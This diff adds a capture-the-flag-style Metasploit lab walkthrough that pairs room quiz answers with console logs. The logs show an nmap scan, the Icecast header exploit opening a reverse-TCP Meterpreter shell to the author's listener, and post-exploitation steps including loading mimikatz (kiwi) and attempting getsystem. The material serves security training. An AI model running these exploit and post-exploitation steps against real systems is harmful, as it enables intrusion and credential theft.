@@ -841,3 +841,846 @@ Metasploit tip: When in a module, use back to go
 back to the top level prompt
 Metasploit Documentation: https://docs.metasploit.com/
 
+┌──(witty㉿kali)-[/tmp]
+└─$ more console.log
+[*] Spooling to file /tmp/console.log...
+```
+```text
+msf6 > banner
+
+      .:okOOOkdc'           'cdkOOOko:.
+    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
+   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
+  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
+  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
+  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
+  lOOOOOOOO.         ;d;         ,OOOOOOOOl
+  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
+   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
+    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
+     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
+      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
+       .dOOo   .OOOOocccxOOOO.   xOOd.
+         ,kOl  .OOOOOOOOOOOOO. .dOk,
+           :kk;.OOOOOOOOOOOOO.cOk:
+             ;kOOOOOOOOOOOOOOOk:
+               ,xOOOOOOOOOOOx,
+                 .lOOOOOOOl.
+                    ,dOd,
+                      .
+
+       =[ metasploit v6.2.26-dev                          ]
++ -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
++ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: When in a module, use back to go 
+back to the top level prompt
+Metasploit Documentation: https://docs.metasploit.com/
+```
+```text
+msf6 > 
+
+I get it :)
+```
+```text
+msf6 > tips
+
+   Id  Tip
+   --  ---
+   0   View all productivity tips with the tips command
+   1   Enable verbose logging with set VERBOSE true
+   2   When in a module, use back to go back to the top level prompt
+   3   Tired of setting RHOSTS for modules? Try globally setting it with setg RHOSTS x.x.x.
+       x
+   4   Enable HTTP request and response logging with set HttpTrace true
+   5   You can upgrade a shell to a Meterpreter session on many platforms using sessions -u
+        <session_id>
+   6   Open an interactive Ruby terminal with irb
+   7   Use the resource command to run commands from a file
+   8   To save all commands executed since start up to a file, use the makerc command
+   9   View advanced module options with advanced
+   10  You can use help to view all available commands
+   11  Use help <command> to learn more about any command
+   12  View a module's description using info, or the enhanced version in your browser with
+        info -d
+   13  After running db_nmap, be sure to check out the result of hosts and services
+   14  Save the current environment with the save command, future console restarts will use
+        this environment again
+   15  Search can apply complex filters such as search cve:2009 type:exploit, see all the f
+       ilters with help search
+   16  Metasploit can be configured at startup, see msfconsole --help to learn more
+   17  Display the Framework log using the log command, learn more with help log
+   18  Adapter names can be used for IP params set LHOST eth0
+   19  Use sessions -1 to interact with the last opened session
+   20  View missing module options with show missing
+   21  Start commands with a space to avoid saving them to history
+   22  You can pivot connections over sessions started with the ssh_login modules
+   23  Use the analyze command to suggest runnable modules for hosts
+   24  Set the current module's RHOSTS with database values using hosts -R or services -R
+   25  Writing a custom module? After editing your module, why not try the reload command
+   26  Use the edit command to open the currently active module in your editor
+```
+```text
+msf6 > save
+Saved configuration to: /home/witty/.msf4/config
+```
+```text
+msf6 > set lhost 10.8.19.103
+lhost => 10.8.19.103
+```
+```text
+msf6 > set lport 4444
+lport => 4444
+```
+```text
+msf6 > save
+Saved configuration to: /home/witty/.msf4/config
+
+┌──(witty㉿kali)-[~/.msf4]
+└─$ cat config 
+[framework/core]
+lhost=10.8.19.103
+lport=4444
+
+[framework/features]
+
+[framework/ui/console]
+```
+Let's go ahead and start exploring the help menu. On the Metasploit prompt (where we'll be at after we start Metasploit using msfconsole), type the command: `help`
+Completed
+The help menu has a very short one-character alias, what is it?
+*?*
+Finding various modules we have at our disposal within Metasploit is one of the most common commands we will leverage in the framework. What is the base command we use for searching?
+*search*
+Once we've found the module we want to leverage, what command we use to select it as the active module?
+*use*
+How about if we want to view information about either a specific module or just the active one we have selected?
+*info*
+Metasploit has a built-in netcat-like function where we can make a quick connection with a host simply to verify that we can 'talk' to it. What command is this?
+*connect*
+Entirely one of the commands purely utilized for fun, what command displays the motd/ascii art we see when we start msfconsole (without -q flag)?
+The art we see at the start of of msfconsole is called a 'banner'
+*banner*
+We'll revisit these next two commands shortly, however, they're two of the most used commands within Metasploit. First, what command do we use to change the value of a variable?
+*set*
+Metasploit supports the use of global variables, something which is incredibly useful when you're specifically focusing on a single box. What command changes the value of a variable globally?
+*setg*
+Now that we've learned how to change the value of variables, how do we view them? There are technically several answers to this question, however, I'm looking for a specific three-letter command which is used to view the value of single variables.
+This has a global option similar to how set has set and setg
+*get*
+How about changing the value of a variable to null/no value?
+This is also very similar to set
+*unset*
+When performing a penetration test it's quite common to record your screen either for further review or for providing evidence of any actions taken. This is often coupled with the collection of console output to a file as it can be incredibly useful to grep for different pieces of information output to the screen. What command can we use to set our console output to save to a file?
+*spool*
+Leaving a Metasploit console running isn't always convenient and it can be helpful to have all of our previously set values load when starting up Metasploit. What command can we use to store the settings/active datastores from Metasploit to a settings file? This will save within your msf4 (or msf5) directory and can be undone easily by simply removing the created settings file.
+*save*
+### Modules for Every Occasion!
+Metasploit consists of six core modules that make up the bulk of the tools you will utilize within it. Let's take a quick look through the various modules, their purposes, and some of the commands associated with modules.
+![](https://i.imgur.com/iYuiWvP.png)
+_*Note, this diagram includes both the interfaces and *most* of the modules. This diagram does not include the 'Post' module._
+Answer the questions below
+Easily the most common module utilized, which module holds all of the exploit code we will use?
+*Exploit*
+Used hand in hand with exploits, which module contains the various bits of shellcode we send to have executed following exploitation?
+*Payload*
+Which module is most commonly used in scanning and verification machines are exploitable? This is not the same as the actual exploitation of course.
+*Auxiliary*
+One of the most common activities after exploitation is looting and pivoting. Which module provides these capabilities?
+See my note below the image above
+*Post*
+Commonly utilized in payload obfuscation, which module allows us to modify the 'appearance' of our exploit such that we may avoid signature detection?
+*Encoder*
+Last but not least, which module is used with buffer overflow and ROP attacks?
+*NOP*
+Not every module is loaded in by default, what command can we use to load different modules?
+This can be found within the msfconsole help command output
+```text
+msf6 > load -l
+[*] Available Framework plugins:
+    * lab
+    * aggregator
+    * session_notifier
+    * request
+    * wiki
+    * besecure
+    * openvas
+    * sounds
+    * beholder
+    * thread
+    * event_tester
+    * sample
+    * db_credcollect
+    * wmap
+    * session_tagger
+    * nexpose
+    * libnotify
+    * nessus
+    * token_adduser
+    * pcap_log
+    * db_tracker
+    * ips_filter
+    * socket_logger
+    * capture
+    * msfd
+    * sqlmap
+    * alias
+    * rssfeed
+    * token_hunter
+    * msgrpc
+    * auto_add_route
+    * ffautoregen
+```
+```text
+msf6 > load -s
+```
+*load*
+### Move that shell!
+Start Machine
+Remember that database we set up? In this step, we're going to take a look at what we can use it for and exploit our victim while we're at it!
+As you might have noticed, up until this point we haven't touched nmap in this room, let alone perform much recon on our victim box. That'll all change now as we'll take a swing at using nmap within Metasploit. **Go ahead and deploy the box now, it may have up to a three-minute delay for starting up our target vulnerable service.**
+_*Note, Metasploit does support different types of port scans from within the auxiliary modules. **Metasploit can also import other scans from nmap and Nessus just to name a few.**_
+Answer the questions below
+```text
+msf6 > db_nmap -sV 10.10.89.131
+[*] Nmap: Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-28 12:53 EST
+[*] Nmap: Stats: 0:01:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+[*] Nmap: Service scan Timing: About 41.67% done; ETC: 12:55 (0:00:48 remaining)
+[*] Nmap: Nmap scan report for 10.10.89.131
+[*] Nmap: Host is up (0.27s latency).
+[*] Nmap: Not shown: 987 closed tcp ports (conn-refused)
+[*] Nmap: PORT      STATE    SERVICE            VERSION
+[*] Nmap: 125/tcp   filtered locus-map
+[*] Nmap: 135/tcp   open     msrpc              Microsoft Windows RPC
+[*] Nmap: 139/tcp   open     netbios-ssn        Microsoft Windows netbios-ssn
+[*] Nmap: 445/tcp   open     microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+[*] Nmap: 3389/tcp  open     ssl/ms-wbt-server?
+[*] Nmap: 5357/tcp  open     http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+[*] Nmap: 8000/tcp  open     http               Icecast streaming media server
+[*] Nmap: 49152/tcp open     msrpc              Microsoft Windows RPC
+[*] Nmap: 49153/tcp open     msrpc              Microsoft Windows RPC
+[*] Nmap: 49154/tcp open     msrpc              Microsoft Windows RPC
+[*] Nmap: 49158/tcp open     msrpc              Microsoft Windows RPC
+[*] Nmap: 49159/tcp open     msrpc              Microsoft Windows RPC
+[*] Nmap: 49160/tcp open     msrpc              Microsoft Windows RPC
+[*] Nmap: Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 162.62 seconds
+
+┌──(witty㉿kali)-[/tmp]
+└─$ nmap 10.10.89.131 -p- --min-rate 5000
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-28 12:57 EST
+Warning: 10.10.89.131 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.89.131
+Host is up (0.20s latency).
+Not shown: 49765 closed tcp ports (conn-refused), 15761 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+5357/tcp  open  wsdapi
+49153/tcp open  unknown
+49154/tcp open  unknown
+49159/tcp open  unknown
+49160/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 69.80 seconds
+```
+```text
+msf6 > services
+Services
+========
+
+host          port   proto  name               state     info
+----          ----   -----  ----               -----     ----
+10.10.89.131  125    tcp    locus-map          filtered
+10.10.89.131  135    tcp    msrpc              open      Microsoft Windows RPC
+10.10.89.131  139    tcp    netbios-ssn        open      Microsoft Windows netbios-ssn
+10.10.89.131  445    tcp    microsoft-ds       open      Microsoft Windows 7 - 10 microsoft
+                                                         -ds workgroup: WORKGROUP
+10.10.89.131  3389   tcp    ssl/ms-wbt-server  open
+10.10.89.131  5357   tcp    http               open      Microsoft HTTPAPI httpd 2.0 SSDP/U
+                                                         PnP
+10.10.89.131  8000   tcp    http               open      Icecast streaming media server
+10.10.89.131  49152  tcp    msrpc              open      Microsoft Windows RPC
+10.10.89.131  49153  tcp    msrpc              open      Microsoft Windows RPC
+10.10.89.131  49154  tcp    msrpc              open      Microsoft Windows RPC
+10.10.89.131  49158  tcp    msrpc              open      Microsoft Windows RPC
+10.10.89.131  49159  tcp    msrpc              open      Microsoft Windows RPC
+10.10.89.131  49160  tcp    msrpc              open      Microsoft Windows RPC
+
+MSRPC stands for Microsoft Remote Procedure Call, which is a protocol used for interprocess communication (IPC) between distributed systems in a network. MSRPC is based on the RPC protocol, which allows a process to execute a code in another process or machine without requiring the developer to explicitly manage the communication details.
+
+In Microsoft Windows, MSRPC is a critical component of the Distributed Component Object Model (DCOM), which enables communication between components running on different machines in a network. DCOM uses MSRPC to manage the communication between client and server components, allowing applications to share data and resources across the network.
+
+MSRPC is also used in the implementation of some network protocols, such as the Server Message Block (SMB) protocol used for file sharing in Windows networks. MSRPC provides a secure and reliable way to transfer data and commands between networked systems, while also providing authentication and encryption mechanisms to protect against unauthorized access and eavesdropping.
+```
+```text
+msf6 > hosts
+
+Hosts
+=====
+
+address       mac  name  os_name  os_flavor  os_sp  purpose  info  comments
+-------       ---  ----  -------  ---------  -----  -------  ----  --------
+10.10.89.131             Unknown                    device
+```
+```text
+msf6 > vulns
+
+Vulnerabilities
+===============
+
+Timestamp  Host  Name  References
+---------  ----  ----  ----------
+```
+```text
+msf6 > use icecast
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+
+Matching Modules
+================
+```
+```text
+#  Name                                 Disclosure Date  Rank   Check  Description
+   -  ----                                 ---------------  ----   -----  -----------
+   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header
+
+[*] Using exploit/windows/http/icecast_header
+```
+```text
+msf6 exploit(windows/http/icecast_header) >
+```
+```text
+msf6 exploit(windows/http/icecast_header) > info 0
+
+       Name: Icecast Header Overwrite
+     Module: exploit/windows/http/icecast_header
+   Platform: Windows
+       Arch: 
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Great
+  Disclosed: 2004-09-28
+
+Provided by:
+  spoonm <spoonm@no$email.com>
+  Luigi Auriemma <aluigi@autistici.org>
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Automatic
+
+Check supported:
+  No
+
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  RHOSTS                   yes       The target host(s), see https://github.com/rapid7/meta
+                                     sploit-framework/wiki/Using-Metasploit
+  RPORT   8000             yes       The target port (TCP)
+
+Payload information:
+  Space: 2000
+  Avoid: 3 characters
+
+Description:
+  This module exploits a buffer overflow in the header parsing of 
+  icecast versions 2.0.1 and earlier, discovered by Luigi Auriemma. 
+  Sending 32 HTTP headers will cause a write one past the end of a 
+  pointer array. On win32 this happens to overwrite the saved 
+  instruction pointer, and on linux (depending on compiler, etc) this 
+  seems to generally overwrite nothing crucial (read not exploitable). 
+  This exploit uses ExitThread(), this will leave icecast thinking the 
+  thread is still in use, and the thread counter won't be decremented. 
+  This means for each time your payload exits, the counter will be 
+  left incremented, and eventually the threadpool limit will be maxed. 
+  So you can multihit, but only till you fill the threadpool.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2004-1561
+  OSVDB (10406)
+  http://www.securityfocus.com/bid/11271
+  http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html
+
+View the full module info with the info -d command.
+```
+```text
+msf6 exploit(windows/http/icecast_header) > search multi/handler
+
+Matching Modules
+================
+```
+```text
+#  Name                                                 Disclosure Date  Rank       Check  Description
+   -  ----                                                 ---------------  ----       -----  -----------
+   0  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
+   1  exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
+   2  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
+   3  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
+   4  exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
+   5  exploit/multi/handler                                                 manual     No     Generic Payload Handler
+   6  exploit/windows/mssql/mssql_linkcrawler              2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
+   7  exploit/windows/browser/persits_xupload_traversal    2009-09-29       excellent  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
+   8  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence
+
+Interact with a module by name or index. For example info 8, use 8 or use exploit/linux/local/yum_package_manager_persistence
+```
+```text
+msf6 exploit(windows/http/icecast_header) > use 5
+[*] Using configured payload generic/shell_reverse_tcp
+```
+```text
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+```
+```text
+msf6 exploit(multi/handler) > set LHOST 10.8.19.103
+LHOST => 10.8.19.103
+```
+```text
+msf6 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, th
+                                        read, process, none)
+   LHOST     10.8.19.103      yes       The listen address (an interface may
+                                        be specified)
+   LPORT     4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+View the full module info with the info, or info -d command.
+```
+```text
+msf6 exploit(multi/handler) > use icecast
+[*] Using configured payload windows/meterpreter/reverse_tcp
+
+Matching Modules
+================
+```
+```text
+#  Name                                 Disclosure Date  Rank   Check  Description
+   -  ----                                 ---------------  ----   -----  -----------
+   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header
+
+[*] Using exploit/windows/http/icecast_header
+```
+```text
+msf6 exploit(windows/http/icecast_header) > set RHOSTS 10.10.89.131
+RHOSTS => 10.10.89.131
+```
+```text
+msf6 exploit(windows/http/icecast_header) > show options
+
+Module options (exploit/windows/http/icecast_header):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.10.89.131     yes       The target host(s), see https://github.
+                                      com/rapid7/metasploit-framework/wiki/Us
+                                      ing-Metasploit
+   RPORT   8000             yes       The target port (TCP)
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, th
+                                        read, process, none)
+   LHOST     10.8.19.103      yes       The listen address (an interface may
+                                        be specified)
+   LPORT     4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+View the full module info with the info, or info -d command.
+```
+```text
+msf6 exploit(windows/http/icecast_header) > run -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.8.19.103:4444
+```
+```text
+msf6 exploit(windows/http/icecast_header) > [*] Sending stage (175686 bytes) to 10.10.89.131
+[*] Meterpreter session 1 opened (10.8.19.103:4444 -> 10.10.89.131:49249) at 2023-02-28 13:56:15 -0500
+```
+```text
+msf6 exploit(windows/http/icecast_header) > jobs
+
+Jobs
+====
+
+No active jobs.
+```
+```text
+msf6 exploit(windows/http/icecast_header) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                  Information           Connection
+  --  ----  ----                  -----------           ----------
+  1         meterpreter x86/wind  Dark-PC\Dark @ DARK-  10.8.19.103:4444 -> 1
+            ows                   PC                    0.10.89.131:49249 (10
+                                                        .10.89.131)
+```
+```text
+msf6 exploit(windows/http/icecast_header) > sessions -i 1
+[*] Starting interaction with 1...
+```
+```text
+meterpreter > help
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background t
+                              hread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    detach                    Detach the meterpreter session (for http/https)
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current s
+                              ession
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the s
+                              ession
+    migrate                   Migrate the server to another process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the sess
+                              ion
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establis
+                              h session
+    ssl_verify                Modify the SSL certificate verification setting
+    transport                 Manage the transport mechanisms
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    del           Delete the specified file
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcat          Read the contents of a local file to the screen
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    show_mount    List all mount points/logical drives
+    upload        Upload a file or directory
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    arp           Display the host ARP cache
+    getproxy      Display the current proxy configuration
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    netstat       Display the network connections
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+    route         View and modify the routing table
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    clearev       Clear the event log
+    drop_token    Relinquishes any active impersonation token.
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getprivs      Attempt to enable all privileges available to the current p
+                  rocess
+    getsid        Get the SID of the user that the server is running as
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    reboot        Reboots the remote computer
+    reg           Modify and interact with the remote registry
+    rev2self      Calls RevertToSelf() on the remote machine
+    shell         Drop into a system command shell
+    shutdown      Shuts down the remote computer
+    steal_token   Attempts to steal an impersonation token from the target pr
+                  ocess
+    suspend       Suspends or resumes a list of processes
+    sysinfo       Gets information about the remote system, such as OS
+
+Stdapi: User interface Commands
+===============================
+
+    Command        Description
+    -------        -----------
+    enumdesktops   List all accessible desktops and window stations
+    getdesktop     Get the current meterpreter desktop
+    idletime       Returns the number of seconds the remote user has been idl
+                   e
+    keyboard_send  Send keystrokes
+    keyevent       Send key events
+    keyscan_dump   Dump the keystroke buffer
+    keyscan_start  Start capturing keystrokes
+    keyscan_stop   Stop capturing keystrokes
+    mouse          Send mouse events
+    screenshare    Watch the remote user desktop in real time
+    screenshot     Grab a screenshot of the interactive desktop
+    setdesktop     Change the meterpreters current desktop
+    uictl          Control some of the user interface components
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    record_mic     Record audio from the default microphone for X seconds
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio file (.wav) on the target system
+
+Priv: Elevate Commands
+======================
+
+    Command       Description
+    -------       -----------
+    getsystem     Attempt to elevate your privilege to that of local system.
+
+Priv: Password database Commands
+================================
+
+    Command       Description
+    -------       -----------
+    hashdump      Dumps the contents of the SAM database
+
+Priv: Timestomp Commands
+========================
+
+    Command       Description
+    -------       -----------
+    timestomp     Manipulate file MACE attributes
+```
+Metasploit comes with a built-in way to run nmap and feed it's results directly into our database. Let's run that now by using the command `db_nmap -sV MACHINE_IP`
+You can add a '-vv' flag to this if you're impatient like me and like to see results
+What service does nmap identify running on **port 135?**
+You might have to run the command 'services' to see the results of the scan again here.
+*msrpc*
+Let's go ahead and see what information we have collected in the database. Try typing the command `hosts` into the msfconsole now.
+Completed
+How about something else from the database, try the command `services` now.
+Completed
+One last thing, try the command `vulns` now. This won't show much at the current moment, however, it's worth noting that Metasploit will keep track of discovered vulnerabilities. One of the many ways the database can be leveraged quickly and powerfully.
+Completed
+Now that we've scanned our victim system, let's try connecting to it with a Metasploit payload. First, we'll have to search for the target payload. In Metasploit 5 (the most recent version at the time of writing) you can simply type `use` followed by a unique string found within only the target exploit. For example, try this out now with the following command `use icecast`. What is the full path for our exploit that now appears on the msfconsole prompt? *This will include the exploit section at the start
+*exploit/windows/http/icecast_header*
+While that use command with the unique string can be incredibly useful that's not quite the exploit we want here. Let's now run the command `search multi/handler`.
+Go ahead and run the command `use NUMBER_NEXT_TO  exploit/multi/handler` wherein the number will be what appears in that far left column (typically this will be 4 or 5). In this way, we can use our search results without typing out the full name/path of the module we want to use.
+---
+What is the name of the column on the far left side of the console that shows up next to 'Name'?
+*#*
+Now type the command `use NUMBER_FROM_PREVIOUS_QUESTION`. This is the short way to use modules returned by search results.
+Completed
+Next, let's set the payload using this command `set PAYLOAD windows/meterpreter/reverse_tcp`. In this way, we can modify which payloads we want to use with our exploits. Additionally, let's run this command `set LHOST YOUR_IP_ON_TRYHACKME`. You might have to check your IP using the command `ip addr`, it will likely be your **tun0** interface.
+Completed
+Let's go ahead and return to our previous exploit, run the command `use icecast` to select it again.
+Completed
+One last step before we can run our exploit. Run the command `set RHOSTS MACHINE_IP` to tell Metasploit which target to attack.
+Completed
+Once you're set those variables correctly, run the exploit now via either the command `exploit` or the command `run -j` to run this as a job.
+Completed
+Once we've started this, we can check all of the jobs running on the system by running the command `jobs`
+Completed
+After we've established our connection in the next task, we can list all of our sessions using the command `sessions`. Similarly, we can interact with a target session using the command `sessions -i SESSION_NUMBER`
+Completed
+### We're in, now what?
+Now that we've got a shell into our victim machine, let's take a look at several post-exploitation modules actions we can leverage! **Most of the questions in the following section can be answered by using the Meterpreter help menu which can be accessed through the 'help' command. This menu dynamically expands as we load more modules.**
+Answer the questions below
+```text
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name         Arch  Session  User          Path
+ ---   ----  ----         ----  -------  ----          ----
+ 0     0     [System Pro
+             cess]
+ 4     0     System
+ 416   4     smss.exe
+ 496   692   svchost.exe
+ 544   536   csrss.exe
+ 584   692   svchost.exe
+ 596   536   wininit.exe
+ 604   584   csrss.exe
+ 652   584   winlogon.ex
+             e
+ 692   596   services.ex
+             e
+ 700   596   lsass.exe
+ 708   596   lsm.exe
+ 820   692   svchost.exe
+ 888   692   svchost.exe
+ 936   692   svchost.exe
+ 1064  692   svchost.exe
+ 1200  692   svchost.exe
+ 1312  496   dwm.exe      x64   1        Dark-PC\Dark  C:\Windows\System32\dw
+                                                       m.exe
+ 1332  1296  explorer.ex  x64   1        Dark-PC\Dark  C:\Windows\explorer.ex
+             e                                         e
+ 1384  692   spoolsv.exe
+ 1412  692   svchost.exe
+ 1468  692   taskhost.ex  x64   1        Dark-PC\Dark  C:\Windows\System32\ta
+             e                                         skhost.exe
+ 1560  820   WmiPrvSE.ex
+             e
+ 1580  692   amazon-ssm-
+             agent.exe
+ 1660  692   LiteAgent.e
+             xe
+ 1696  692   svchost.exe
+ 1848  692   Ec2Config.e
+             xe
+ 2040  692   svchost.exe
+ 2268  1332  Icecast2.ex  x86   1        Dark-PC\Dark  C:\Program Files (x86)
+             e                                         \Icecast2 Win32\Icecas
+                                                       t2.exe
+ 2328  692   vds.exe
+ 2412  692   sppsvc.exe
+ 2568  692   TrustedInst
+             aller.exe
+ 2604  692   SearchIndex
+             er.exe
+ 2784  820   slui.exe     x64   1        Dark-PC\Dark  C:\Windows\System32\sl
+                                                       ui.exe
+```
+```text
+meterpreter > migrate 1384
+[*] Migrating from 2268 to 1384...
+[-] Error running command migrate: Rex::RuntimeError Cannot migrate into this process (insufficient privileges)
+```
+```text
+meterpreter > getuid
+Server username: Dark-PC\Dark
+```
+```text
+meterpreter > sysinfo
+Computer        : DARK-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+```
+```text
+meterpreter > load -l
+bofloader
+espia
+extapi
+incognito
+kiwi
+lanattacks
+peinjector
+powershell
+priv
+python
+sniffer
+stdapi
+unhook
+winpmem
+```
+```text
+meterpreter > load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+[!] Loaded x86 Kiwi on an x64 architecture.
+
+Success.
+```
+```text
+meterpreter > getsystem
+
+[-] priv_elevate_getsystem: Operation failed: 691 The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+[-] Named Pipe Impersonation (Dropper/Admin)
